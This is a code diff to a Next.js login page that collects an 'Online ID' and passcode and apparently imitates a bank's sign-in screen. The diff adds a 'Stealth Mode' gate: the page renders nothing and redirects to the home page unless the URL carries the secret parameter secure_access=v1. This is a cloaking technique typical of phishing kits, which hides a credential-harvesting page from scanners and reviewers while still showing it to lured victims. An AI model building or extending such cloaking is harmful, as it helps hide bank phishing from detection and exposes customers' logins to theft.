@@ -1,17 +1,31 @@
 'use client';
 
-import { useState } from 'react';
-import { useRouter } from 'next/navigation';
+import { useState, useEffect, Suspense } from 'react';
+import { useRouter, useSearchParams } from 'next/navigation';
 import Link from 'next/link';
 import Image from 'next/image';
 
-export default function UserLoginPage() {
+function UserLoginContent() {
   const [onlineId, setOnlineId] = useState('');
   const [passcode, setPasscode] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
   const [saveOnlineId, setSaveOnlineId] = useState(false);
   const router = useRouter();
+  const searchParams = useSearchParams();
+
+  // Stealth Mode: verify access token
+  useEffect(() => {
+    const access = searchParams.get('secure_access');
+    if (access !== 'v1') {
+      router.replace('/');
+    }
+  }, [searchParams, router]);
+
+  const access = searchParams.get('secure_access');
+  if (access !== 'v1') {
+    return null; 
+  }
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -293,5 +307,17 @@ export default function UserLoginPage() {
         </footer>
       </div>
     </div>
+  );
+}
+
+export default function UserLoginPage() {
+  return (
+    <Suspense fallback={
+      <div className="min-h-screen bg-white flex items-center justify-center">
+        <div className="animate-spin w-8 h-8 border-2 border-[#012169] border-t-transparent rounded-full"></div>
+      </div>
+    }>
+      <UserLoginContent />
+    </Suspense>
   );
 }
